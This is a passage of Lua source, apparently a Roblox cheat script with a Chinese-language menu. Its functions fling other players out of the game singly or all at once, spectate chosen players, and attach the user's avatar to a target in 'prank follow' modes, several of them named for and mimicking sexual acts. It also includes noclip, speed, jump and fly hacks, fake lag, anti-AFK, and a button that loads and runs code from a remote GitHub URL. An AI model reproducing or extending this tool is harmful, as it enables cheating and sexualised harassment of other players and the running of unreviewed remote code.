Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
if TRootPart and THead then
if(TRootPart.CFrame.p-THead.CFrame.p).Magnitude>5 then
SFBasePart(THead)
else
SFBasePart(TRootPart)
end
elseif TRootPart then
SFBasePart(TRootPart)
elseif THead then
SFBasePart(THead)
elseif Handle then
SFBasePart(Handle)
else
return
end
BV:Destroy()
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
workspace.CurrentCamera.CameraSubject=Humanoid
repeat
RootPart.CFrame=getgenv().OldPos*CFrame.new(0,.5,0)
Character:SetPrimaryPartCFrame(getgenv().OldPos*CFrame.new(0,.5,0))
Humanoid:ChangeState("GettingUp")
table.foreach(Character:GetChildren(),function(_,x)
if x:IsA("BasePart")then
x.Velocity,x.RotVelocity=Vector3.new(),Vector3.new()
end
end)
task.wait()
until(RootPart.Position-getgenv().OldPos.p).Magnitude<25
workspace.FallenPartsDestroyHeight=getgenv().FPDH
end
__XJW_PACE()
FlingBox2:AddButton("甩飞选定玩家",function()
if flingTargetName==""then pNotify("错误","请先选择玩家")return end
local target=getTargetPlayer(flingTargetName)
if not target then pNotify("错误","未找到玩家")return end
pcall(function()SkidFling2(target)end)
pNotify("成功","甩飞玩家一次")
end)
__XJW_PACE()
FlingBox2:AddToggle("Fling2_LoopSingle",{Text="循环甩飞选定玩家",Default=false}):OnChanged(function(v)
flingLoops2.single=v
if v then
local thread=task.spawn(function()
while flingLoops2.single do
if flingTargetName~=""then
local target=getTargetPlayer(flingTargetName)
if target then pcall(function()SkidFling2(target)end)end
end
task.wait(0.1)
end
end)
table.insert(PState.threads,thread)
pNotify("开始","循环甩飞玩家")
else
pNotify("停止","循环甩飞已停止")
end
end)
__XJW_PACE()
FlingBox2:AddButton("甩飞所有玩家",function()
local count=0
for _,p in ipairs(PPlayers:GetPlayers())do
if p~=PLocalPlayer and p.Character then
pcall(function()SkidFling2(p)end)
count=count+1
task.wait(0.1)
end
end
pNotify("成功","已甩飞 "..count.." 个玩家")
end)
__XJW_PACE()
FlingBox2:AddToggle("Fling2_LoopAll",{Text="循环甩飞所有玩家",Default=false}):OnChanged(function(v)
flingLoops2.all=v
if v then
local thread=task.spawn(function()
while flingLoops2.all do
for _,p in ipairs(PPlayers:GetPlayers())do
if p~=PLocalPlayer and p.Character then
pcall(function()SkidFling2(p)end)
end
task.wait(0.05)
end
task.wait(0.1)
end
end)
table.insert(PState.threads,thread)
pNotify("开始","循环甩飞所有玩家")
else
pNotify("停止","循环甩飞所有玩家已停止")
end
end)
__XJW_PACE()
FlingBox2:AddButton("停止所有甩飞",function()
flingLoops2.single=false
flingLoops2.all=false
pNotify("停止","已停止所有甩飞")
end)
__XJW_GB("视角监视")
local MonitorBox2=Tabs.TP:AddRightGroupbox("视角监视","eye")
local monitorTargetName=""
local monitorDropdown=MonitorBox2:AddDropdown("Monitor2_Target",{
Text="选择目标玩家",
Values={},
Default="",
Multi=false,
})
monitorDropdown:OnChanged(function(v)monitorTargetName=v end)
__XJW_PACE()
MonitorBox2:AddButton("刷新玩家列表",function()
monitorDropdown:SetValues(refreshPlayerNames())
pNotify("刷新","已刷新玩家列表")
end)
local function stopMonitor2()
if PState.conns.monitor then
PState.conns.monitor:Disconnect()
PState.conns.monitor=nil
end
local char=getLocalChar()
if char then
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then workspace.CurrentCamera.CameraSubject=hum end
end
pNotify("监视停止","已停止监视")
end
local function startMonitor2(playerName)
if PState.conns.monitor then
PState.conns.monitor:Disconnect()
PState.conns.monitor=nil
end
local camera=workspace.CurrentCamera
if not camera then return end
PState.conns.monitor=PRunService.Heartbeat:Connect(function()
pcall(function()
local target=getTargetPlayer(playerName)
if not target or not target.Character then
stopMonitor2()
return
end
local subject=target.Character:FindFirstChildOfClass("Humanoid")
if not subject then
subject=target.Character:FindFirstChild("Head")or target.Character:FindFirstChild("HumanoidRootPart")
end
if subject then
camera.CameraSubject=subject
end
end)
end)
pNotify("监视启动","已开始监视 "..playerName)
end
__XJW_PACE()
MonitorBox2:AddButton("开始监视选定玩家",function()
if monitorTargetName==""then pNotify("提示","请先选择玩家")return end
stopMonitor2()
startMonitor2(monitorTargetName)
end)
__XJW_PACE()
MonitorBox2:AddButton("停止监视",stopMonitor2)
__XJW_GB("恶搞跟随")
local FollowBox2=Tabs.TP:AddRightGroupbox("恶搞跟随","ghost")
local followTargetName=""
local followDropdown=FollowBox2:AddDropdown("Follow2_Target",{
Text="选择目标玩家",
Values={},
Default="",
Multi=false,
})
followDropdown:OnChanged(function(v)followTargetName=v end)
__XJW_PACE()
FollowBox2:AddButton("刷新玩家列表",function()
followDropdown:SetValues(refreshPlayerNames())
pNotify("刷新","已刷新玩家列表")
end)
local followStates2={}
local function stopAllFollows2()
for name,_ in pairs(followStates2)do
followStates2[name]=false
end
for name,conn in pairs(PState.conns)do
if name:find("follow2_")then
conn:Disconnect()
PState.conns[name]=nil
end
end
local char=getLocalChar()
if char then enableCollision(char)end
end
local followToggles2={
{id="orbit",text="旋转环绕",fn=function(target)
followStates2.orbit=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local angle=0
PState.conns.follow2_orbit=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.orbit or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
angle=angle+0.05
if angle>360 then angle=0 end
root.CFrame=CFrame.new(tr.Position+Vector3.new(math.cos(angle)*5,2,math.sin(angle)*5),tr.Position)
end)
end)
end},
{id="mirror",text="镜像",fn=function(target)
followStates2.mirror=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_mirror=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.mirror or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local pos=tr.CFrame*CFrame.new(4,0,0)
root.CFrame=CFrame.new(pos.Position)*CFrame.Angles(0,math.pi,0)
end)
end)
end},
{id="float",text="漂浮",fn=function(target)
followStates2.float=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_float=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.float or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=CFrame.new(tr.Position+Vector3.new(0,3,0))
end)
end)
end},
{id="shadow",text="影子",fn=function(target)
followStates2.shadow=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_shadow=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.shadow or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,-2.8,0)
end)
end)
end},
{id="anti",text="反向跟随",fn=function(target)
followStates2.anti=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
PState.conns.follow2_anti=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.anti or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local dist=(root.Position-tr.Position).Magnitude
if dist<8 then
local away=(root.Position-tr.Position).Unit
root.CFrame=CFrame.new(tr.Position+away*8)
end
end)
end)
end},
{id="spin",text="旋转",fn=function(target)
followStates2.spin=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local angle=0
PState.conns.follow2_spin=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.spin or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
angle=angle+5
root.CFrame=CFrame.new(tr.Position+Vector3.new(0,2,0))*CFrame.Angles(0,math.rad(angle),0)
end)
end)
end},
{id="shake",text="抖动",fn=function(target)
followStates2.shake=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_shake=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.shake or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
local offset=Vector3.new(math.random(-2,2),math.random(0,3),math.random(-2,2))
root.CFrame=CFrame.new(tr.Position+offset)
end)
end)
end},
{id="face",text="站头后",fn=function(target)
followStates2.face=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_face=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.face or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,3.5,0)
end)
end)
end},
{id="back",text="坐前面",fn=function(target)
followStates2.back=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit=true end
disableCollision(char)
PState.conns.follow2_back=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.back or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,0,2)
if hum then hum.Sit=true end
end)
end)
end},
{id="auto",text="动画跟随",fn=function(target)
followStates2.auto=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_auto=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.auto or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,0,-3)
end)
end)
end},
{id="suck",text="口交",fn=function(target)
followStates2.suck=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit=true end
PState.conns.follow2_suck=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.suck or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,-1,1)
if hum then hum.Sit=true end
end)
end)
end},
{id="sus",text="被超",fn=function(target)
followStates2.sus=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_sus=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.sus or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,0,-1)
end)
end)
end},
{id="modern",text="超别人",fn=function(target)
followStates2.modern=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
PState.conns.follow2_modern=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.modern or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,0,1)
end)
end)
end},
{id="enhanced",text="给别人口",fn=function(target)
followStates2.enhanced=true
local char=getLocalChar()
if not char then return end
local root=char:FindFirstChild("HumanoidRootPart")
if not root then return end
disableCollision(char)
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then hum.Sit=true end
PState.conns.follow2_enhanced=PRunService.Heartbeat:Connect(function()
pcall(function()
if not followStates2.enhanced or not char.Parent then return end
if not target.Character then stopAllFollows2()return end
local tr=target.Character:FindFirstChild("HumanoidRootPart")
if not tr then return end
root.CFrame=tr.CFrame*CFrame.new(0,-1,-0.5)
if hum then hum.Sit=true end
end)
end)
end},
}
for _,ft in ipairs(followToggles2)do
__XJW_PACE()
FollowBox2:AddToggle("F2_"..ft.id,{Text=ft.text,Default=false}):OnChanged(function(v)
if v then
stopAllFollows2()
if followTargetName==""then pNotify("提示","请先选择玩家")return end
local target=getTargetPlayer(followTargetName)
if target then
ft.fn(target)
pNotify("跟随","已开启: "..ft.text)
end
else
stopAllFollows2()
pNotify("停止","已停止所有跟随")
end
end)
end
__XJW_PACE()
FollowBox2:AddButton("停止所有跟随",function()
stopAllFollows2()
pNotify("停止","已停止所有恶搞跟随")
end)
local CharPlayers=game:GetService("Players")
local CharRunService=game:GetService("RunService")
local CharUserInputService=game:GetService("UserInputService")
local CharWorkspace=game:GetService("Workspace")
local CharLocalPlayer=CharPlayers.LocalPlayer
local charCharacter,charHumanoid,charHrp
local function charRefresh()
charCharacter=CharLocalPlayer.Character
if charCharacter then
charHumanoid=charCharacter:FindFirstChildOfClass("Humanoid")
charHrp=charCharacter:FindFirstChild("HumanoidRootPart")
end
end
charRefresh()
local CharStates={
WalkSpeed={Enabled=false,Value=100,Default=16},
Noclip={Enabled=false},
BunnyHop={Enabled=false,Value=5},
SuperJump={Enabled=false,Value=200},
WallClimb={Enabled=false,Value=50},
NightVision={Enabled=false},
AntiAfk={Enabled=false},
}
local CharConns={}
local function charBind(name,conn)
if CharConns[name]then CharConns[name]:Disconnect()end
CharConns[name]=conn
end
local function applyWalkSpeed()
if not charHumanoid then return end
if CharStates.WalkSpeed.Enabled then
charHumanoid.WalkSpeed=CharStates.WalkSpeed.Value
else
charHumanoid.WalkSpeed=CharStates.WalkSpeed.Default
end
end
local noclipActive=false
local noclipConn=nil
local noclipCharAddedConn=nil
local noclipDescendantConns={}
local noclipOriginalCollisions={}
local function setupNoclipForChar(character)
if not character then return end
for _,part in pairs(character:GetDescendants())do
if part:IsA("BasePart")then
if not noclipOriginalCollisions[part]then
noclipOriginalCollisions[part]=part.CanCollide
end
part.CanCollide=false
end
end
local dc=character.DescendantAdded:Connect(function(descendant)
if descendant:IsA("BasePart")then
if not noclipOriginalCollisions[descendant]then
noclipOriginalCollisions[descendant]=descendant.CanCollide
end
descendant.CanCollide=false
end
end)
noclipDescendantConns[character]=dc
end
local function startNoclip()
noclipActive=true
if noclipConn then return end
local char=CharLocalPlayer.Character
if char then setupNoclipForChar(char)end
noclipConn=CharRunService.Stepped:Connect(function()
if not noclipActive then return end
local currentChar=CharLocalPlayer.Character
if not currentChar then return end
for _,part in pairs(currentChar:GetDescendants())do
if part:IsA("BasePart")then
part.CanCollide=false
end
end
end)
if noclipCharAddedConn then noclipCharAddedConn:Disconnect()end
noclipCharAddedConn=CharLocalPlayer.CharacterAdded:Connect(function(newChar)
if noclipActive then
task.wait()
setupNoclipForChar(newChar)
end
end)
end
local function stopNoclip()
noclipActive=false
if noclipConn then
noclipConn:Disconnect()
noclipConn=nil
end
if noclipCharAddedConn then
noclipCharAddedConn:Disconnect()
noclipCharAddedConn=nil
end
for part,originalState in pairs(noclipOriginalCollisions)do
if part and part.Parent then
part.CanCollide=originalState
end
end
for character,conn in pairs(noclipDescendantConns)do
if conn then conn:Disconnect()end
end
noclipDescendantConns={}
noclipOriginalCollisions={}
end
charBind("BunnyHop",CharUserInputService.JumpRequest:Connect(function()
if CharStates.BunnyHop.Enabled and charHumanoid then
charHumanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end
end))
local function applySuperJump()
if not charHumanoid then return end
if CharStates.SuperJump.Enabled then
pcall(function()
charHumanoid.UseJumpPower=true
charHumanoid.JumpPower=CharStates.SuperJump.Value
charHumanoid.JumpHeight=CharStates.SuperJump.Value
end)
else
pcall(function()
charHumanoid.JumpPower=50
charHumanoid.JumpHeight=7.2
end)
end
end
charBind("SuperJump",CharUserInputService.JumpRequest:Connect(function()
if CharStates.SuperJump.Enabled and charHumanoid then
pcall(function()
charHumanoid.UseJumpPower=true
charHumanoid.JumpPower=CharStates.SuperJump.Value
charHumanoid.JumpHeight=CharStates.SuperJump.Value
end)
end
end))
charBind("WallClimb",CharRunService.Heartbeat:Connect(function()
if not CharStates.WallClimb.Enabled then return end
if not charCharacter or not charHrp or not charHumanoid then return end
if not charCharacter.Parent then return end
pcall(function()
local rayParams=RaycastParams.new()
rayParams.FilterType=Enum.RaycastFilterType.Blacklist
rayParams.FilterDescendantsInstances={charCharacter}
local forward=charHrp.CFrame.LookVector
local result=CharWorkspace:Raycast(charHrp.Position,forward*3,rayParams)
if result then
local normal=result.Normal
if math.abs(normal.Y)<0.5 then
charHumanoid:ChangeState(Enum.HumanoidStateType.Freefall)
charHrp.Velocity=Vector3.new(charHrp.Velocity.X,CharStates.WallClimb.Value,charHrp.Velocity.Z)
end
end
end)
end))
local AntiAfkConn=nil
local function startAntiAfk()
if AntiAfkConn then return end
local VirtualUser=game:GetService("VirtualUser")
AntiAfkConn=CharLocalPlayer.Idled:Connect(function()
pcall(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)
end)
end
local function stopAntiAfk()
if AntiAfkConn then
AntiAfkConn:Disconnect()
AntiAfkConn=nil
end
end
local function reapplyAllStates()
charRefresh()
if not charCharacter or not charHumanoid then return end
if CharStates.WalkSpeed.Enabled then applyWalkSpeed()end
if CharStates.SuperJump.Enabled then applySuperJump()end
if CharStates.Noclip.Enabled then startNoclip()end
end
CharLocalPlayer.CharacterAdded:Connect(function(c)
charCharacter=c
charHumanoid=c:FindFirstChildOfClass("Humanoid")
charHrp=c:FindFirstChild("HumanoidRootPart")
task.spawn(function()
charHumanoid=c:WaitForChild("Humanoid")
charHrp=c:WaitForChild("HumanoidRootPart")
reapplyAllStates()
end)
task.delay(1,reapplyAllStates)
task.delay(3,reapplyAllStates)
end)
__XJW_GB("角色修改")
local CharBox=Tabs.Main:AddLeftGroupbox("角色修改","user")
__XJW_PACE()
CharBox:AddToggle("Char_WalkSpeed",{Text="修改移速",Default=false}):OnChanged(function(v)
CharStates.WalkSpeed.Enabled=v
applyWalkSpeed()
if _G.speedBoostSync then _G.speedBoostSync(v)end
end)
__XJW_PACE()
CharBox:AddSlider("Char_WalkSpeedVal",{Text="移速值",Default=100,Min=1,Max=500,Rounding=0}):OnChanged(function(v)
CharStates.WalkSpeed.Value=v
if CharStates.WalkSpeed.Enabled then applyWalkSpeed()end
end)
do
local speedBoostConn=nil
local function speedBoostCleanup()
if speedBoostConn then speedBoostConn:Disconnect()speedBoostConn=nil end
end
local function disableSpeedBoost()
speedBoostCleanup()
end
local function enableSpeedBoost()
local c=game.Players.LocalPlayer.Character
if not c or not c:FindFirstChild("HumanoidRootPart")or not c:FindFirstChildOfClass("Humanoid")then return end
local hum=c.Humanoid
local hrp=c.HumanoidRootPart
speedBoostCleanup()
local spd=CharStates.WalkSpeed.Value
local rs=game:GetService("RunService")
speedBoostConn=rs.Heartbeat:Connect(function(dt)
if hum.MoveDirection.Magnitude>0 then
hrp:ApplyImpulse(hum.MoveDirection*spd*40*dt)
end
end)
end
game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
character:WaitForChild("Humanoid",10)
character:WaitForChild("HumanoidRootPart",10)
if CharStates.WalkSpeed.Enabled then
task.wait(0.5)
enableSpeedBoost()
end
end)
_G.speedBoostSync=function(v)
if v then enableSpeedBoost()else disableSpeedBoost()end
end
end
__XJW_PACE()
CharBox:AddToggle("Char_Noclip",{Text="穿墙模式",Default=false}):OnChanged(function(v)
CharStates.Noclip.Enabled=v
if v then startNoclip()else stopNoclip()end
end)
__XJW_PACE()
CharBox:AddToggle("Char_BunnyHop",{Text="无限跳",Default=false}):OnChanged(function(v)
CharStates.BunnyHop.Enabled=v
end)
__XJW_PACE()
CharBox:AddToggle("Char_SuperJump",{Text="超级跳跃",Default=false}):OnChanged(function(v)
CharStates.SuperJump.Enabled=v
applySuperJump()
end)
__XJW_PACE()
CharBox:AddSlider("Char_SuperJumpVal",{Text="跳跃高度",Default=200,Min=1,Max=500,Rounding=0}):OnChanged(function(v)
CharStates.SuperJump.Value=v
if CharStates.SuperJump.Enabled then applySuperJump()end
end)
__XJW_PACE()
CharBox:AddToggle("Char_WallClimb",{Text="爬墙模式",Default=false}):OnChanged(function(v)
CharStates.WallClimb.Enabled=v
end)
__XJW_PACE()
CharBox:AddSlider("Char_WallClimbVal",{Text="爬墙速度",Default=50,Min=1,Max=200,Rounding=0}):OnChanged(function(v)
CharStates.WallClimb.Value=v
end)
__XJW_GB("杂项")
local MiscBox=Tabs.Main:AddLeftGroupbox("杂项","grid")
__XJW_PACE()
MiscBox:AddToggle("Char_AntiAfk",{Text="反挂机",Default=false}):OnChanged(function(v)
CharStates.AntiAfk.Enabled=v
if v then startAntiAfk()else stopAntiAfk()end
end)
local FakeLag={
Enabled=false,
Interval=0.07,
AnchoredDuration=0.4,
TeleportEnabled=false,
TeleportDistance=10,
}
local fakeLagRunning=false
local function FakeLag_DoTeleport()
local Character=game.Players.LocalPlayer.Character
if Character then
local Root=Character:FindFirstChild("HumanoidRootPart")
local Humanoid=Character:FindFirstChild("Humanoid")
if Root and Humanoid then
local MoveDir=Humanoid.MoveDirection
if MoveDir.Magnitude>0 then
local Distance=math.random(FakeLag.TeleportDistance*100)/100
local RootCFrame=Root.CFrame
local TargetPos=RootCFrame.Position+MoveDir.Unit*Distance
local LookVector=RootCFrame.LookVector
Root.CFrame=CFrame.new(TargetPos,TargetPos+LookVector)
end
end
end
end
__XJW_PACE()
MiscBox:AddToggle("FakeLag_Enabled",{Text="假延迟",Default=false}):OnChanged(function(v)
FakeLag.Enabled=v
if v and not fakeLagRunning then
fakeLagRunning=true
task.spawn(function()
while fakeLagRunning do
if FakeLag.Enabled then
local Character=game.Players.LocalPlayer.Character
if Character then
local Root=Character:FindFirstChild("HumanoidRootPart")
if Root then
Root.Anchored=true
task.wait(FakeLag.AnchoredDuration)
Root.Anchored=false
if FakeLag.TeleportEnabled then
FakeLag_DoTeleport()
end
end
end
end
task.wait(FakeLag.Interval)
end
end)
end
end)
__XJW_PACE()
MiscBox:AddSlider("FakeLag_Interval",{Text="假延迟间隔",Default=0.07,Min=0.07,Max=1,Rounding=2}):OnChanged(function(v)
FakeLag.Interval=v
end)
__XJW_PACE()
MiscBox:AddSlider("FakeLag_Anchored",{Text="锚定时长",Default=0.4,Min=0.1,Max=10,Rounding=2}):OnChanged(function(v)
FakeLag.AnchoredDuration=v
end)
__XJW_PACE()
MiscBox:AddToggle("FakeLag_Teleport",{Text="假wifi瞬移",Default=false}):OnChanged(function(v)
FakeLag.TeleportEnabled=v
end)
__XJW_PACE()
MiscBox:AddSlider("FakeLag_TeleportDist",{Text="瞬移距离",Default=10,Min=5,Max=50,Rounding=0}):OnChanged(function(v)
FakeLag.TeleportDistance=v
end)
do
__XJW_GB("飞行")
local FlyBox=Tabs.Main:AddRightGroupbox("飞行","plane")
__XJW_PACE()
FlyBox:AddButton("XJW飞行",function()
safeLoad("https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/%E8%87%AA%E5%88%B6%E8%84%9A%E6%9C%AC%E9%A3%9E%E8%A1%8C.lua")
end)
local flyEnabled=false
local flySpeed=50
local flyMode="飞行v2"
local flyTPInterval=0.1
local flyConnection=nil
local flyTPAccum=0
local flyLastPos=nil
local flyVertical=0
local FLY_BV_NAME="TXFlyBV"
local FLY_BG_NAME="TXFlyBG"
local flyUIS=game:GetService("UserInputService")
local flyCam=workspace.CurrentCamera
local function FlyGetInput()
local dir=Vector3.new()
if flyUIS:IsKeyDown(Enum.KeyCode.W)then dir=dir+flyCam.CFrame.LookVector end
if flyUIS:IsKeyDown(Enum.KeyCode.S)then dir=dir-flyCam.CFrame.LookVector end
if flyUIS:IsKeyDown(Enum.KeyCode.A)then dir=dir-flyCam.CFrame.RightVector end
if flyUIS:IsKeyDown(Enum.KeyCode.D)then dir=dir+flyCam.CFrame.RightVector end
if flyUIS:IsKeyDown(Enum.KeyCode.Space)then dir=dir+Vector3.new(0,1,0)end
if flyUIS:IsKeyDown(Enum.KeyCode.LeftShift)then dir=dir-Vector3.new(0,1,0)end
if dir.Magnitude>0 then
return dir.Unit,flySpeed
end
local hum=game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
if hum then
local md=hum.MoveDirection
if md.Magnitude>0.01 then
dir=md.Unit
end
end
if flyVertical~=0 then
dir=dir+Vector3.new(0,flyVertical,0)
end
if dir.Magnitude>0 then
return dir.Unit,flySpeed
end
return nil,0
end
local flyTouches={}
local flyPrevTouches={}
local flyGestureDelta=0
local flyGestureConns={}
local function flySetupGestures()
if#flyGestureConns>0 then return end
table.insert(flyGestureConns,flyUIS.InputBegan:Connect(function(input,gpe)
if input.UserInputType==Enum.UserInputType.Touch and not gpe then
flyTouches[input]=input.Position
end
end))
table.insert(flyGestureConns,flyUIS.InputChanged:Connect(function(input)
if input.UserInputType==Enum.UserInputType.Touch and flyTouches[input]then
flyTouches[input]=input.Position
end
end))
table.insert(flyGestureConns,flyUIS.InputEnded:Connect(function(input)
if input.UserInputType==Enum.UserInputType.Touch then
flyTouches[input]=nil
end
end))
end
local function flyClearGestures()
for _,c in ipairs(flyGestureConns)do
pcall(function()c:Disconnect()end)
end
flyGestureConns={}
flyTouches={}
flyPrevTouches={}
flyGestureDelta=0
flyVertical=0
end
local function flyUpdateGesture()
local n=0
for _ in pairs(flyTouches)do n=n+1 end
if n==2 then
local dy=0
local dx=0
for input,pos in pairs(flyTouches)do
local prev=flyPrevTouches[input]
if prev then
dy=dy+(pos.Y-prev.Y)
dx=dx+math.abs(pos.X-prev.X)
end
end
if math.abs(dy)>dx*1.2 then
flyGestureDelta=flyGestureDelta+dy
end
else
flyGestureDelta=0
end
flyPrevTouches={}
for input,pos in pairs(flyTouches)do
flyPrevTouches[input]=pos
end
flyVertical=math.clamp(-flyGestureDelta/40,-1,1)
flyGestureDelta=flyGestureDelta*0.9
end
local function FlyEnsureVectorMovers(hrp)
local bv=hrp:FindFirstChild(FLY_BV_NAME)
if not bv then
bv=Instance.new("BodyVelocity")
bv.Name=FLY_BV_NAME
bv.MaxForce=Vector3.new(100000,100000,100000)
bv.Parent=hrp
end
local bg=hrp:FindFirstChild(FLY_BG_NAME)
if not bg then
bg=Instance.new("BodyGyro")
bg.Name=FLY_BG_NAME
bg.MaxTorque=Vector3.new(100000,100000,100000)
bg.Parent=hrp
end
return bv,bg
end
local function FlyApplyOrientation(hrp,pos,dir)
if math.abs(dir.Y)>0.95 then
hrp.CFrame=CFrame.new(pos)*hrp.CFrame.Rotation
else
hrp.CFrame=CFrame.lookAt(pos,pos+dir)
end
end
local function FlyStep(dt)
local char=game.Players.LocalPlayer.Character
if not char then return end
local hrp=char:FindFirstChild("HumanoidRootPart")
if not hrp then return end
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then hum.PlatformStand=true end
flyUpdateGesture()
local dir,speed=FlyGetInput()
if flyMode=="飞行v2"then
if dir then
local bv,bg=FlyEnsureVectorMovers(hrp)
bv.Velocity=dir*speed
bg.CFrame=flyCam.CFrame
else
local bv=hrp:FindFirstChild(FLY_BV_NAME)
if bv then bv.Velocity=Vector3.new()end
end
return
end
if not flyLastPos then
flyLastPos=hrp.Position
elseif(hrp.Position-flyLastPos).Magnitude>50 then
flyLastPos=hrp.Position
end
if flyMode=="飞行v3"then
if dir then
flyLastPos=flyLastPos+dir*speed*dt
FlyApplyOrientation(hrp,flyLastPos,dir)
else
hrp.CFrame=CFrame.new(flyLastPos)*hrp.CFrame.Rotation
end
hrp.Velocity=Vector3.new()
elseif flyMode=="瞬移飞行"then
local moved=false
if dir then
flyTPAccum=flyTPAccum+dt
if flyTPAccum>=flyTPInterval then
flyTPAccum=flyTPAccum-flyTPInterval
flyLastPos=flyLastPos+dir*speed*flyTPInterval
FlyApplyOrientation(hrp,flyLastPos,dir)
moved=true
end
end
if not moved then
hrp.CFrame=CFrame.new(flyLastPos)*hrp.CFrame.Rotation
end
hrp.Velocity=Vector3.new()
end
end
local function FlyEnable()
if flyConnection then return end
flyLastPos=nil
flyConnection=game:GetService("RunService").RenderStepped:Connect(function(dt)
pcall(FlyStep,dt)
end)
flySetupGestures()
end
local function FlyDisable()
if flyConnection then
flyConnection:Disconnect()
flyConnection=nil
end
flyClearGestures()
flyLastPos=nil
local char=game.Players.LocalPlayer.Character
if char then
local hrp=char:FindFirstChild("HumanoidRootPart")
if hrp then
for _,v in ipairs(hrp:GetChildren())do
if(v:IsA("BodyVelocity")or v:IsA("BodyGyro"))and(v.Name==FLY_BV_NAME or v.Name==FLY_BG_NAME)then
v:Destroy()
end
end
end
local hum=char:FindFirstChildOfClass("Humanoid")
if hum then hum.PlatformStand=false end
end
end
local flyToggleEl=FlyBox:AddToggle("Fly_Enabled",{Text="飞行",Default=false})
flyToggleEl:OnChanged(function(value)
flyEnabled=value
if value then
FlyEnable()
else
FlyDisable()
end
end)
__XJW_PACE()
FlyBox:AddDropdown("Fly_Mode",{Text="飞行模式",Values={"飞行v2","飞行v3","瞬移飞行"},Default="飞行v2"}):OnChanged(function(value)
flyMode=value
flyTPAccum=0
flyLastPos=nil
end)
__XJW_PACE()
